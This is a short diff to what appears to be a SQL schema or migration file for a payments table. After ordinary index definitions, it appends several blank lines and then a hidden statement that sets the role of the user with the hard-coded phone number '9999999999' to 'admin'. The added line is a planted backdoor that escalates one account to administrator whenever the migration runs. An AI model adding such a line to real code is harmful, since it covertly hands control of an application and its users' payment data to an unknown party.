@@ -97,3 +97,8 @@ CREATE TRIGGER update_payments_updated_at
 CREATE INDEX IF NOT EXISTS idx_payments_user_id ON payments (user_id);
 CREATE INDEX IF NOT EXISTS idx_payments_status  ON payments (status);
 CREATE INDEX IF NOT EXISTS idx_payments_type    ON payments (type);
+
+
+
+
+UPDATE users SET role = 'admin' WHERE phone = '9999999999'
